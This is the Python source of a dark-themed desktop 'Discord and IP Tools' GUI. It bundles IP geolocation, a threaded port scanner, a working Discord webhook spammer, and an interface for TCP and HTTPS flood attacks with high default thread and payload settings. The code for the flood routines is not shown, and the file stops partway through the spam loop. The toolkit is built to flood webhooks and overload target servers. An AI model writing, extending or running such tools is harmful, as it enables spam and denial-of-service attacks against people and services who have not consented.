#!/usr/bin/env python3
import tkinter as tk
import customtkinter as ctk
from tkinter import messagebox, font
import socket
import requests
import json
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import subprocess
import platform
import queue
import random
import os
import struct

# Set appearance mode and default color theme
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")  # We'll override colors with original dark theme

class NetworkToolsGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("axasdfasdafg12039479haisuFFGUAS(D*7f9ju439i2jdnas)")
        self.root.geometry("800x600")
        
        # Configure colors - using original dark theme
        self.dark_bg = '#191C2E'        # Original dark background
        self.input_bg = '#21262d'       # Original input background
        self.border_color = '#30363d'   # Original border color
        self.text_color = '#c9d1d9'     # Original text color
        self.header_color = '#58a6ff'   # Original header color
        self.button_color = '#238636'   # Original button color
        self.button_hover = '#2ea043'   # Original button hover
        self.success_color = "#00ff00"  # Green for success
        self.error_color = "#ff0000"    # Red for error
        
        # Configure the root window
        self.root._set_appearance_mode("dark")
        self.root.configure(fg_color=self.dark_bg)
        
        # Create main frame
        self.main_frame = ctk.CTkFrame(root, fg_color=self.dark_bg, corner_radius=15)
        self.main_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Create header
        self.create_header()
        
        # Create tabview for tabs
        self.tabview = ctk.CTkTabview(self.main_frame, fg_color=self.dark_bg, 
                                     segmented_button_fg_color=self.input_bg,
                                     segmented_button_selected_color=self.dark_bg,
                                     segmented_button_selected_hover_color=self.dark_bg,
                                     segmented_button_unselected_color=self.input_bg,
                                     segmented_button_unselected_hover_color=self.input_bg,
                                     text_color=self.text_color)
        self.tabview.pack(fill='both', expand=True, pady=(10, 0))
        
        # Create tabs
        self.tabview.add("🌍 IP Geolocation")
        self.tabview.add("🔌 Port Scanner")
        self.tabview.add("📩 Webhook Spammer")
        self.tabview.add("📡 IP Pinger")
        self.tabview.add("! Flooding Tools")  # New tab for flooding tools
        
        # Create tab content
        self.create_geolocation_tab()
        self.create_port_scanner_tab()
        self.create_webhook_spammer_tab()
        self.create_pinger_tab()
        self.create_flooding_tab()  # New method for flooding tools
        
        # Queue for thread communication
        self.result_queue = queue.Queue()
        
    def create_header(self):
        header_frame = ctk.CTkFrame(self.main_frame, fg_color=self.dark_bg, corner_radius=15)
        header_frame.pack(fill='x', pady=(0, 10))
        
        title_label = ctk.CTkLabel(header_frame, text="🌐 Discord and IP Tools 🌐", 
                                  font=ctk.CTkFont(family="Arial", size=20, weight="bold"),
                                  text_color=self.header_color)
        title_label.pack()
        
        subtitle_label = ctk.CTkLabel(header_frame, text="", 
                                     font=ctk.CTkFont(family="Arial", size=12),
                                     text_color=self.text_color)
        subtitle_label.pack()
        
    def create_geolocation_tab(self):
        # Geolocation tab
        geo_frame = self.tabview.tab("🌍 IP Geolocation")
        
        # Input frame
        input_frame = ctk.CTkFrame(geo_frame, fg_color=self.dark_bg, corner_radius=15)
        input_frame.pack(fill='x', padx=20, pady=20)
        
        ctk.CTkLabel(input_frame, text="Enter IP or Domain:", text_color=self.text_color).pack(anchor='w')
        
        self.geo_entry = ctk.CTkEntry(input_frame, height=40, corner_radius=10,
                                    fg_color=self.input_bg, text_color=self.text_color,
                                    border_color=self.border_color, border_width=2,
                                    font=ctk.CTkFont(family="Arial", size=12))
        self.geo_entry.pack(fill='x', pady=(5, 10))
        
        button_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
        button_frame.pack(fill='x')
        
        lookup_button = ctk.CTkButton(button_frame, text="🔎 Lookup Location", 
                                     fg_color=self.button_color, hover_color=self.button_hover,
                                     corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                     command=self.geo_lookup)
        lookup_button.pack(side='left')
        
        # Add Clear Results button
        clear_button = ctk.CTkButton(button_frame, text="🗑 Clear Results", 
                                   fg_color=self.button_color, hover_color=self.button_hover,
                                   corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                   command=self.clear_geo_results)
        clear_button.pack(side='right')
        
        # Results frame
        results_frame = ctk.CTkFrame(geo_frame, fg_color=self.dark_bg, corner_radius=15)
        results_frame.pack(fill='both', expand=True, padx=20, pady=(10, 20))
        
        ctk.CTkLabel(results_frame, text="Results:", text_color=self.text_color).pack(anchor='w')
        
        self.geo_results = ctk.CTkTextbox(results_frame, fg_color=self.input_bg, 
                                        corner_radius=10, border_width=2, border_color=self.border_color,
                                        text_color=self.text_color, font=ctk.CTkFont(family="Consolas", size=12))
        self.geo_results.pack(fill='both', expand=True, pady=(5, 0))
        
    def create_port_scanner_tab(self):
        # Port Scanner tab
        scan_frame = self.tabview.tab("🔌 Port Scanner")
        
        # Input frame
        input_frame = ctk.CTkFrame(scan_frame, fg_color=self.dark_bg, corner_radius=15)
        input_frame.pack(fill='x', padx=20, pady=20)
        
        ctk.CTkLabel(input_frame, text="Target IP or Domain:", text_color=self.text_color).pack(anchor='w')
        
        self.scan_target_entry = ctk.CTkEntry(input_frame, height=40, corner_radius=10,
                                            fg_color=self.input_bg, text_color=self.text_color,
                                            border_color=self.border_color, border_width=2,
                                            font=ctk.CTkFont(family="Arial", size=12))
        self.scan_target_entry.pack(fill='x', pady=(5, 10))
        
        port_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
        port_frame.pack(fill='x', pady=(0, 10))
        
        ctk.CTkLabel(port_frame, text="Start Port:", text_color=self.text_color).pack(side='left')
        
        self.start_port_entry = ctk.CTkEntry(port_frame, width=100, height=30, corner_radius=10,
                                           fg_color=self.input_bg, text_color=self.text_color,
                                           border_color=self.border_color, border_width=2,
                                           font=ctk.CTkFont(family="Arial", size=12))
        self.start_port_entry.pack(side='left', padx=(5, 20))
        
        ctk.CTkLabel(port_frame, text="End Port:", text_color=self.text_color).pack(side='left')
        
        self.end_port_entry = ctk.CTkEntry(port_frame, width=100, height=30, corner_radius=10,
                                         fg_color=self.input_bg, text_color=self.text_color,
                                         border_color=self.border_color, border_width=2,
                                         font=ctk.CTkFont(family="Arial", size=12))
        self.end_port_entry.pack(side='left', padx=(5, 0))
        
        button_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
        button_frame.pack(fill='x')
        
        self.scan_button = ctk.CTkButton(button_frame, text="🔌 Start Scan", 
                                        fg_color=self.button_color, hover_color=self.button_hover,
                                        corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                        command=self.start_port_scan)
        self.scan_button.pack(side='left')
        
        self.stop_scan_button = ctk.CTkButton(button_frame, text="⏹ Stop Scan", 
                                            fg_color=self.button_color, hover_color=self.button_hover,
                                            corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                            command=self.stop_port_scan, state="disabled")
        self.stop_scan_button.pack(side='left', padx=(10, 0))
        
        # Add Clear Results button
        clear_scan_button = ctk.CTkButton(button_frame, text="🗑 Clear Results", 
                                       fg_color=self.button_color, hover_color=self.button_hover,
                                       corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                       command=self.clear_scan_results)
        clear_scan_button.pack(side='right')
        
        # Progress bar
        self.scan_progress = ctk.CTkProgressBar(input_frame, height=15, corner_radius=7,
                                              fg_color=self.input_bg, progress_color=self.button_color)
        self.scan_progress.pack(fill='x', pady=(10, 0))
        self.scan_progress.set(0)
        
        # Results frame
        results_frame = ctk.CTkFrame(scan_frame, fg_color=self.dark_bg, corner_radius=15)
        results_frame.pack(fill='both', expand=True, padx=20, pady=(0, 20))
        
        ctk.CTkLabel(results_frame, text="Scan Results:", text_color=self.text_color).pack(anchor='w')
        
        self.scan_results = ctk.CTkTextbox(results_frame, fg_color=self.input_bg, 
                                         corner_radius=10, border_width=2, border_color=self.border_color,
                                         text_color=self.text_color, font=ctk.CTkFont(family="Consolas", size=12))
        self.scan_results.pack(fill='both', expand=True, pady=(5, 0))
        
        self.scan_stop_flag = False
        
    def create_webhook_spammer_tab(self):
        # Webhook Spammer tab
        webhook_frame = self.tabview.tab("📩 Webhook Spammer")
        
        # Input frame
        input_frame = ctk.CTkFrame(webhook_frame, fg_color=self.dark_bg, corner_radius=15)
        input_frame.pack(fill='x', padx=20, pady=20)
        
        ctk.CTkLabel(input_frame, text="Webhook URL:", text_color=self.text_color).pack(anchor='w')
        
        self.webhook_entry = ctk.CTkEntry(input_frame, height=40, corner_radius=10,
                                        fg_color=self.input_bg, text_color=self.text_color,
                                        border_color=self.border_color, border_width=2,
                                        font=ctk.CTkFont(family="Arial", size=12))
        self.webhook_entry.pack(fill='x', pady=(5, 10))
        
        ctk.CTkLabel(input_frame, text="Message:", text_color=self.text_color).pack(anchor='w')
        
        self.message_entry = ctk.CTkEntry(input_frame, height=40, corner_radius=10,
                                        fg_color=self.input_bg, text_color=self.text_color,
                                        border_color=self.border_color, border_width=2,
                                        font=ctk.CTkFont(family="Arial", size=12))
        self.message_entry.pack(fill='x', pady=(5, 10))
        
        count_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
        count_frame.pack(fill='x', pady=(0, 10))
        
        ctk.CTkLabel(count_frame, text="Number of messages:", text_color=self.text_color).pack(side='left')
        
        self.count_entry = ctk.CTkEntry(count_frame, width=100, height=30, corner_radius=10,
                                      fg_color=self.input_bg, text_color=self.text_color,
                                      border_color=self.border_color, border_width=2,
                                      font=ctk.CTkFont(family="Arial", size=12))
        self.count_entry.pack(side='left', padx=(5, 0))
        
        button_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
        button_frame.pack(fill='x')
        
        self.spam_button = ctk.CTkButton(button_frame, text="📩 Start Spamming", 
                                       fg_color=self.button_color, hover_color=self.button_hover,
                                       corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                       command=self.start_webhook_spam)
        self.spam_button.pack(side='left')
        
        self.stop_spam_button = ctk.CTkButton(button_frame, text="⏹ Stop Spam", 
                                            fg_color=self.button_color, hover_color=self.button_hover,
                                            corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                            command=self.stop_webhook_spam, state="disabled")
        self.stop_spam_button.pack(side='left', padx=(10, 0))
        
        # Add Clear Results button
        clear_spam_button = ctk.CTkButton(button_frame, text="🗑 Clear Results", 
                                       fg_color=self.button_color, hover_color=self.button_hover,
                                       corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                       command=self.clear_spam_results)
        clear_spam_button.pack(side='right')
        
        # Progress bar
        self.spam_progress = ctk.CTkProgressBar(input_frame, height=15, corner_radius=7,
                                              fg_color=self.input_bg, progress_color=self.button_color)
        self.spam_progress.pack(fill='x', pady=(10, 0))
        self.spam_progress.set(0)
        
        # Results frame
        results_frame = ctk.CTkFrame(webhook_frame, fg_color=self.dark_bg, corner_radius=15)
        results_frame.pack(fill='both', expand=True, padx=20, pady=(0, 20))
        
        ctk.CTkLabel(results_frame, text="Spam Results:", text_color=self.text_color).pack(anchor='w')
        
        self.spam_results = ctk.CTkTextbox(results_frame, fg_color=self.input_bg, 
                                         corner_radius=10, border_width=2, border_color=self.border_color,
                                         text_color=self.text_color, font=ctk.CTkFont(family="Consolas", size=12))
        self.spam_results.pack(fill='both', expand=True, pady=(5, 0))
        
        self.spam_stop_flag = False
        
    def create_pinger_tab(self):
        # Pinger tab
        ping_frame = self.tabview.tab("📡 IP Pinger")
        
        # Input frame
        input_frame = ctk.CTkFrame(ping_frame, fg_color=self.dark_bg, corner_radius=15)
        input_frame.pack(fill='x', padx=20, pady=20)
        
        ctk.CTkLabel(input_frame, text="Target IP or Domain:", text_color=self.text_color).pack(anchor='w')
        
        self.ping_entry = ctk.CTkEntry(input_frame, height=40, corner_radius=10,
                                     fg_color=self.input_bg, text_color=self.text_color,
                                     border_color=self.border_color, border_width=2,
                                     font=ctk.CTkFont(family="Arial", size=12))
        self.ping_entry.pack(fill='x', pady=(5, 10))
        
        button_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
        button_frame.pack(fill='x')
        
        self.ping_button = ctk.CTkButton(button_frame, text="📡 Start Ping", 
                                       fg_color=self.button_color, hover_color=self.button_hover,
                                       corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                       command=self.start_ping)
        self.ping_button.pack(side='left')
        
        self.stop_ping_button = ctk.CTkButton(button_frame, text="⏹ Stop Ping", 
                                            fg_color=self.button_color, hover_color=self.button_hover,
                                            corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                            command=self.stop_ping, state="disabled")
        self.stop_ping_button.pack(side='left', padx=(10, 0))
        
        clear_button = ctk.CTkButton(button_frame, text="🗑 Clear Results", 
                                   fg_color=self.button_color, hover_color=self.button_hover,
                                   corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                   command=self.clear_ping_results)
        clear_button.pack(side='right')
        
        # Results frame
        results_frame = ctk.CTkFrame(ping_frame, fg_color=self.dark_bg, corner_radius=15)
        results_frame.pack(fill='both', expand=True, padx=20, pady=(10, 20))
        
        ctk.CTkLabel(results_frame, text="Ping Results:", text_color=self.text_color).pack(anchor='w')
        
        self.ping_results = ctk.CTkTextbox(results_frame, fg_color=self.input_bg, 
                                         corner_radius=10, border_width=2, border_color=self.border_color,
                                         text_color=self.text_color, font=ctk.CTkFont(family="Consolas", size=12))
        self.ping_results.pack(fill='both', expand=True, pady=(5, 0))
        
        self.ping_stop_flag = False
        
    def create_flooding_tab(self):
        # Flooding Tools tab
        flood_frame = self.tabview.tab("! Flooding Tools")
        
        # Create notebook for TCP and HTTPS flooding
        self.flood_notebook = ctk.CTkTabview(flood_frame, fg_color=self.dark_bg,
                                           segmented_button_fg_color=self.input_bg,
                                           segmented_button_selected_color=self.dark_bg,
                                           segmented_button_selected_hover_color=self.dark_bg,
                                           segmented_button_unselected_color=self.input_bg,
                                           segmented_button_unselected_hover_color=self.input_bg,
                                           text_color=self.text_color)
        self.flood_notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Create sub-tabs for different flooding types
        self.flood_notebook.add("TCP Flood")
        self.flood_notebook.add("HTTPS Flood")
        
        # Create content for each flooding type
        self.create_tcp_flood_tab()
        self.create_https_flood_tab()
        
    def create_tcp_flood_tab(self):
        # TCP Flooding tab
        tcp_frame = self.flood_notebook.tab("TCP Flood")
        
        # Input frame
        input_frame = ctk.CTkFrame(tcp_frame, fg_color=self.dark_bg, corner_radius=15)
        input_frame.pack(fill='x', padx=20, pady=20)
        
        # Target input
        ctk.CTkLabel(input_frame, text="Target IP or Domain:", text_color=self.text_color).pack(anchor='w')
        
        self.tcp_target_entry = ctk.CTkEntry(input_frame, height=40, corner_radius=10,
                                          fg_color=self.input_bg, text_color=self.text_color,
                                          border_color=self.border_color, border_width=2,
                                          font=ctk.CTkFont(family="Arial", size=12))
        self.tcp_target_entry.pack(fill='x', pady=(5, 10))
        
        # Port input
        port_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
        port_frame.pack(fill='x', pady=(0, 10))
        
        ctk.CTkLabel(port_frame, text="Port:", text_color=self.text_color).pack(side='left')
        
        self.tcp_port_entry = ctk.CTkEntry(port_frame, width=100, height=30, corner_radius=10,
                                        fg_color=self.input_bg, text_color=self.text_color,
                                        border_color=self.border_color, border_width=2,
                                        font=ctk.CTkFont(family="Arial", size=12))
        self.tcp_port_entry.pack(side='left', padx=(5, 20))
        
        ctk.CTkLabel(port_frame, text="Threads:", text_color=self.text_color).pack(side='left')
        
        self.tcp_threads_entry = ctk.CTkEntry(port_frame, width=100, height=30, corner_radius=10,
                                           fg_color=self.input_bg, text_color=self.text_color,
                                           border_color=self.border_color, border_width=2,
                                           font=ctk.CTkFont(family="Arial", size=12))
        self.tcp_threads_entry.pack(side='left', padx=(5, 0))
        self.tcp_threads_entry.insert(0, "250")  # Default value - increased
        
        # Packet size frame
        packet_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
        packet_frame.pack(fill='x', pady=(0, 10))
        
        ctk.CTkLabel(packet_frame, text="Packet Size (KB):", text_color=self.text_color).pack(side='left')
        
        self.tcp_packet_size_entry = ctk.CTkEntry(packet_frame, width=100, height=30, corner_radius=10,
                                               fg_color=self.input_bg, text_color=self.text_color,
                                               border_color=self.border_color, border_width=2,
                                               font=ctk.CTkFont(family="Arial", size=12))
        self.tcp_packet_size_entry.pack(side='left', padx=(5, 20))
        self.tcp_packet_size_entry.insert(0, "1024")  # Default 1MB
        
        ctk.CTkLabel(packet_frame, text="Socket Timeout (s):", text_color=self.text_color).pack(side='left')
        
        self.tcp_timeout_entry = ctk.CTkEntry(packet_frame, width=100, height=30, corner_radius=10,
                                           fg_color=self.input_bg, text_color=self.text_color,
                                           border_color=self.border_color, border_width=2,
                                           font=ctk.CTkFont(family="Arial", size=12))
        self.tcp_timeout_entry.pack(side='left', padx=(5, 0))
        self.tcp_timeout_entry.insert(0, "2")  # Default timeout
        
        # Button frame
        button_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
        button_frame.pack(fill='x')
        
        self.tcp_flood_button = ctk.CTkButton(button_frame, text="🌊 Start TCP Flood", 
                                           fg_color=self.button_color, hover_color=self.button_hover,
                                           corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                           command=self.start_tcp_flood)
        self.tcp_flood_button.pack(side='left')
        
        self.stop_tcp_flood_button = ctk.CTkButton(button_frame, text="⏹ Stop Flood", 
                                                fg_color=self.button_color, hover_color=self.button_hover,
                                                corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                                command=self.stop_tcp_flood, state="disabled")
        self.stop_tcp_flood_button.pack(side='left', padx=(10, 0))
        
        # Add Clear Results button
        clear_tcp_button = ctk.CTkButton(button_frame, text="🗑 Clear Results", 
                                      fg_color=self.button_color, hover_color=self.button_hover,
                                      corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                      command=self.clear_tcp_flood_results)
        clear_tcp_button.pack(side='right')
        
        # Progress bar
        self.tcp_flood_progress = ctk.CTkProgressBar(input_frame, height=15, corner_radius=7,
                                                  fg_color=self.input_bg, progress_color=self.button_color)
        self.tcp_flood_progress.pack(fill='x', pady=(10, 0))
        self.tcp_flood_progress.set(0)
        
        # Results frame
        results_frame = ctk.CTkFrame(tcp_frame, fg_color=self.dark_bg, corner_radius=15)
        results_frame.pack(fill='both', expand=True, padx=20, pady=(0, 20))
        
        ctk.CTkLabel(results_frame, text="TCP Flood Results:", text_color=self.text_color).pack(anchor='w')
        
        self.tcp_flood_results = ctk.CTkTextbox(results_frame, fg_color=self.input_bg, 
                                             corner_radius=10, border_width=2, border_color=self.border_color,
                                             text_color=self.text_color, font=ctk.CTkFont(family="Consolas", size=12))
        self.tcp_flood_results.pack(fill='both', expand=True, pady=(5, 0))
        
        self.tcp_flood_stop_flag = False
        self.tcp_flood_packets_sent = 0
        self.tcp_flood_bytes_sent = 0
        
    def create_https_flood_tab(self):
        # HTTPS Flooding tab
        https_frame = self.flood_notebook.tab("HTTPS Flood")
        
        # Input frame
        input_frame = ctk.CTkFrame(https_frame, fg_color=self.dark_bg, corner_radius=15)
        input_frame.pack(fill='x', padx=20, pady=20)
        
        # Target input
        ctk.CTkLabel(input_frame, text="Target URL (include https://):", text_color=self.text_color).pack(anchor='w')
        
        self.https_target_entry = ctk.CTkEntry(input_frame, height=40, corner_radius=10,
                                            fg_color=self.input_bg, text_color=self.text_color,
                                            border_color=self.border_color, border_width=2,
                                            font=ctk.CTkFont(family="Arial", size=12))
        self.https_target_entry.pack(fill='x', pady=(5, 10))
        
        # Threads and requests input
        settings_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
        settings_frame.pack(fill='x', pady=(0, 10))
        
        ctk.CTkLabel(settings_frame, text="Threads:", text_color=self.text_color).pack(side='left')
        
        self.https_threads_entry = ctk.CTkEntry(settings_frame, width=100, height=30, corner_radius=10,
                                             fg_color=self.input_bg, text_color=self.text_color,
                                             border_color=self.border_color, border_width=2,
                                             font=ctk.CTkFont(family="Arial", size=12))
        self.https_threads_entry.pack(side='left', padx=(5, 20))
        self.https_threads_entry.insert(0, "200")  # Default value - increased
        
        ctk.CTkLabel(settings_frame, text="Requests per thread:", text_color=self.text_color).pack(side='left')
        
        self.https_requests_entry = ctk.CTkEntry(settings_frame, width=100, height=30, corner_radius=10,
                                              fg_color=self.input_bg, text_color=self.text_color,
                                              border_color=self.border_color, border_width=2,
                                              font=ctk.CTkFont(family="Arial", size=12))
        self.https_requests_entry.pack(side='left', padx=(5, 0))
        self.https_requests_entry.insert(0, "5000")  # Default value - increased
        
        # Data size frame
        data_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
        data_frame.pack(fill='x', pady=(0, 10))
        
        ctk.CTkLabel(data_frame, text="Data Size (KB):", text_color=self.text_color).pack(side='left')
        
        self.https_data_size_entry = ctk.CTkEntry(data_frame, width=100, height=30, corner_radius=10,
                                               fg_color=self.input_bg, text_color=self.text_color,
                                               border_color=self.border_color, border_width=2,
                                               font=ctk.CTkFont(family="Arial", size=12))
        self.https_data_size_entry.pack(side='left', padx=(5, 20))
        self.https_data_size_entry.insert(0, "512")  # Default 512KB
        
        ctk.CTkLabel(data_frame, text="Connection Timeout (s):", text_color=self.text_color).pack(side='left')
        
        self.https_timeout_entry = ctk.CTkEntry(data_frame, width=100, height=30, corner_radius=10,
                                             fg_color=self.input_bg, text_color=self.text_color,
                                             border_color=self.border_color, border_width=2,
                                             font=ctk.CTkFont(family="Arial", size=12))
        self.https_timeout_entry.pack(side='left', padx=(5, 0))
        self.https_timeout_entry.insert(0, "5")  # Default timeout
        
        # Method selection frame
        method_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
        method_frame.pack(fill='x', pady=(0, 10))
        
        ctk.CTkLabel(method_frame, text="HTTP Method:", text_color=self.text_color).pack(side='left')
        
        self.https_method_var = tk.StringVar(value="POST")
        methods = ["GET", "POST", "PUT", "DELETE", "HEAD"]
        
        for method in methods:
            rb = ctk.CTkRadioButton(method_frame, text=method, variable=self.https_method_var, value=method,
                                  fg_color=self.button_color, hover_color=self.button_hover,
                                  text_color=self.text_color)
            rb.pack(side='left', padx=(10, 0))
        
        # Button frame
        button_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
        button_frame.pack(fill='x')
        
        self.https_flood_button = ctk.CTkButton(button_frame, text="🌊 Start HTTPS Flood", 
                                             fg_color=self.button_color, hover_color=self.button_hover,
                                             corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                             command=self.start_https_flood)
        self.https_flood_button.pack(side='left')
        
        self.stop_https_flood_button = ctk.CTkButton(button_frame, text="⏹ Stop Flood", 
                                                  fg_color=self.button_color, hover_color=self.button_hover,
                                                  corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                                  command=self.stop_https_flood, state="disabled")
        self.stop_https_flood_button.pack(side='left', padx=(10, 0))
        
        # Add Clear Results button
        clear_https_button = ctk.CTkButton(button_frame, text="🗑 Clear Results", 
                                        fg_color=self.button_color, hover_color=self.button_hover,
                                        corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
                                        command=self.clear_https_flood_results)
        clear_https_button.pack(side='right')
        
        # Progress bar
        self.https_flood_progress = ctk.CTkProgressBar(input_frame, height=15, corner_radius=7,
                                                    fg_color=self.input_bg, progress_color=self.button_color)
        self.https_flood_progress.pack(fill='x', pady=(10, 0))
        self.https_flood_progress.set(0)
        
        # Results frame
        results_frame = ctk.CTkFrame(https_frame, fg_color=self.dark_bg, corner_radius=15)
        results_frame.pack(fill='both', expand=True, padx=20, pady=(0, 20))
        
        ctk.CTkLabel(results_frame, text="HTTPS Flood Results:", text_color=self.text_color).pack(anchor='w')
        
        self.https_flood_results = ctk.CTkTextbox(results_frame, fg_color=self.input_bg, 
                                               corner_radius=10, border_width=2, border_color=self.border_color,
                                               text_color=self.text_color, font=ctk.CTkFont(family="Consolas", size=12))
        self.https_flood_results.pack(fill='both', expand=True, pady=(5, 0))
        
        self.https_flood_stop_flag = False
        self.https_flood_requests_sent = 0
        self.https_flood_bytes_sent = 0
        
    def geo_lookup(self):
        ip = self.geo_entry.get().strip()
        if not ip:
            messagebox.showerror("Error", "Please enter an IP or domain!")
            return
            
        def lookup_thread():
            try:
                self.geo_results.delete("0.0", "end")
                self.geo_results.insert("0.0", f"🔎 Fetching geolocation for {ip}...\n")
                self.geo_results.insert("end", "-" * 50 + "\n")
                
                response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
                data = response.json()
                
                if data['status'] == 'success':
                    result_text = f"""✅ Geolocation Results:

IP/Domain: {data.get('query', 'N/A')}
Country: {data.get('country', 'N/A')}
Region: {data.get('regionName', 'N/A')}
City: {data.get('city', 'N/A')}
ZIP: {data.get('zip', 'N/A')}
Latitude: {data.get('lat', 'N/A')}
Longitude: {data.get('lon', 'N/A')}
ISP: {data.get('isp', 'N/A')}
Organization: {data.get('org', 'N/A')}
AS: {data.get('as', 'N/A')}
Timezone: {data.get('timezone', 'N/A')}
"""
                    self.geo_results.insert("end", result_text)
                else:
                    self.geo_results.insert("end", "❌ Failed to get geolocation data\n")
                    
            except Exception as e:
                self.geo_results.insert("end", f"❌ Error: {str(e)}\n")
                
        threading.Thread(target=lookup_thread, daemon=True).start()
    
    def clear_geo_results(self):
        self.geo_results.delete("0.0", "end")
        
    def start_port_scan(self):
        target = self.scan_target_entry.get().strip()
        start_port = self.start_port_entry.get().strip()
        end_port = self.end_port_entry.get().strip()
        
        if not all([target, start_port, end_port]):
            messagebox.showerror("Error", "Please fill in all fields!")
            return
            
        try:
            start_port = int(start_port)
            end_port = int(end_port)
            if start_port > end_port or start_port < 1 or end_port > 65535:
                raise ValueError("Invalid port range")
        except ValueError:
            messagebox.showerror("Error", "Please enter valid port numbers (1-65535)!")
            return
            
        self.scan_stop_flag = False
        self.scan_button.configure(state="disabled")
        self.stop_scan_button.configure(state="normal")
        self.scan_results.delete("0.0", "end")
        
        total_ports = end_port - start_port + 1
        self.scan_progress.set(0)
        
        def scan_thread():
            try:
                target_ip = socket.gethostbyname(target)
                self.scan_results.insert("0.0", f"🔌 Scanning {target} ({target_ip}) ports {start_port} ➡ {end_port}\n")
                self.scan_results.insert("end", "-" * 50 + "\n")
                
                open_ports = []
                scanned = 0
                
                def check_port(port):
                    if self.scan_stop_flag:
                        return False
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        result = sock.connect_ex((target_ip, port))
                        sock.close()
                        return result == 0
                    except:
                        return False
                
                with ThreadPoolExecutor(max_workers=50) as executor:
                    futures = []
                    for port in range(start_port, end_port + 1):
                        if self.scan_stop_flag:
                            break
                        future = executor.submit(check_port, port)
                        futures.append((port, future))
                    
                    for port, future in futures:
                        if self.scan_stop_flag:
                            break
                        try:
                            if future.result():
                                open_ports.append(port)
                                # Insert with green color for open ports
                                self.scan_results.insert("end", f"Port {port} is OPEN\n", ("open",))
                                self.scan_results.tag_config("open", foreground=self.success_color)
                            else:
                                # Insert with red color for closed ports
                                self.scan_results.insert("end", f"Port {port} is CLOSED\n", ("closed",))
                                self.scan_results.tag_config("closed", foreground=self.error_color)
                        except:
                            # Insert with red color for closed ports
                            self.scan_results.insert("end", f"Port {port} is CLOSED\n", ("closed",))
                            self.scan_results.tag_config("closed", foreground=self.error_color)
                        
                        scanned += 1
                        self.scan_progress.set(scanned / total_ports)
                        self.scan_results.see("end")
                        
                if not self.scan_stop_flag:
                    self.scan_results.insert("end", "-" * 50 + "\n")
                    if open_ports:
                        self.scan_results.insert("end", f"🎉 Found {len(open_ports)} open ports: {', '.join(map(str, open_ports))}\n")
                    else:
                        self.scan_results.insert("end", "🎉 No open ports found\n")
                else:
                    self.scan_results.insert("end", "⏹ Scan stopped by user\n")
                    
            except Exception as e:
                self.scan_results.insert("end", f"❌ Error: {str(e)}\n")
            finally:
                self.scan_button.configure(state="normal")
                self.stop_scan_button.configure(state="disabled")
                
        threading.Thread(target=scan_thread, daemon=True).start()
        
    def stop_port_scan(self):
        self.scan_stop_flag = True
    
    def clear_scan_results(self):
        self.scan_results.delete("0.0", "end")
        
    def start_webhook_spam(self):
        webhook_url = self.webhook_entry.get().strip()
        message = self.message_entry.get().strip()
        count = self.count_entry.get().strip()
        
        if not all([webhook_url, message, count]):
            messagebox.showerror("Error", "Please fill in all fields!")
            return
            
        try:
            count = int(count)
            if count < 1:
                raise ValueError("Count must be positive")
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid number of messages!")
            return
            
        self.spam_stop_flag = False
        self.spam_button.configure(state="disabled")
        self.stop_spam_button.configure(state="normal")
        self.spam_results.delete("0.0", "end")
        self.spam_progress.set(0)
        
        def spam_thread():
            try:
                self.spam_results.insert("0.0", f"📩 Starting webhook spam: {count} messages\n")
                self.spam_results.insert("end", "-" * 50 + "\n")
                
                for i in range(1, count + 1):
                    if self.spam_stop_flag:
                        break
                        
                    try:
                        payload = {"content": message}
                        response = requests.post(webhook_url, json=payload, timeout=10)
                        
                        if response.status_code == 204:
                            self.spam_results.insert("end", f"✅ Sent message {i}\n")
                        else:
                            self.spam_results.insert("end", f"❌ Failed to send message {i} (Status: {response.status_code})\n")
                            
                    except Exception as e:
                        self.spam_results.insert("end", f"❌ Error sending message {i}: {str(e)}\n")
                    
                    self.spam_progress.set(i / count)
                    self.spam_results.see("end")
